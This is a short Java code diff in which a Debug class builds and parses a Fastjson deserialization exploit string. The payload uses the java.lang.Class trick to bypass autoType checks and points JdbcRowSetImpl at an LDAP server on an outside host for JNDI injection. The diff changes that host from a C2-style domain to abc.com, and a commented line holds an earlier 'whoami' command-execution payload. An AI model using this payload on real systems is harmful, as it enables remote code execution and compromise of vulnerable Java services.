@@ -22,7 +22,7 @@ public class Debug {
         //System.out.println(JsonStr);
         //String expStr = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sorry.bug.Execute\"},\"b\":{\"@type\":\"com.sorry.bug.Execute\",\"command\":\"whoami\"}}";
         //绕过autotypesupport限制,unicode16绕waf.
-        String expStr = "{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://mimikatz.c2payload.com:1389/NoEcho\",\"autoCommit\":true}}";
+        String expStr = "{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://abc.com:1389/NoEcho\",\"autoCommit\":true}}";
         JSON.parseObject(expStr);
         /*
         String agentId = "41797";
